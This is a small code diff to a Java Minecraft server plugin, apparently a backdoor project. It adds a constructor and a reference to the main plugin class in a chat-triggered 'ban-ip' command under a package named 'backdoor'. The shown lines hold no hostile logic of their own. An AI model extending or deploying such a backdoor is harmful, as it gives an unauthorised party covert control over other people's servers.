@@ -2,6 +2,7 @@ package me.tsb.backdoor.commands.bans;
 
 import me.tsb.backdoor.Command;
 import me.tsb.backdoor.RegisterCommand;
+import me.tsb.plugin.Main;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
@@ -11,6 +12,12 @@ import java.util.ArrayList;
 
 @RegisterCommand(displayName = "ban-ip", aliases = {"ban-ip"})
 public class BanIpCommand extends Command {
+
+    private final Main main;
+
+    public BanIpCommand (Main main) {
+        this.main = main;
+    }
 
     @Override
     public void onExec(PlayerChatEvent event, ArrayList<String> args) {
